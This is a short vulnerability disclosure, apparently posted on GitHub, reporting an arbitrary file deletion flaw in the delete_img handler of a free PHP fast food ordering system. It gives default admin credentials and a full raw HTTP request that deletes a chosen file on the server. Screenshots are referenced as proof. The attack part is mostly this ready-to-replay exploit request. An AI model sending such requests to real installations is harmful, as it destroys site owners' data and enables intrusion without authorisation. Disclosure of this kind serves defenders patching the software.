# Fast Food Ordering System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/classes/Master.php?f=delete_img

Vulnerability location: /ffos/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shell.php file in the root directory

```sql
POST /ffos/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/ffos/admin/?page=system_info
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

path=C%3A%2Fxampp%2Fhtdocs%2Fffos%2Fshell.php
```

The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/171353532-53c80237-d831-4e9f-8683-df46b53c0cd8.png)

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the root directory of the website

![image](https://user-images.githubusercontent.com/54017627/171353575-111c1b92-3ee4-441b-8755-2bb83d68b0f3.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/171353637-8fe1f3c4-71b4-46aa-8717-016015200b27.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/171353689-cdd0740b-3a36-4bff-b65e-bd371425c084.png)
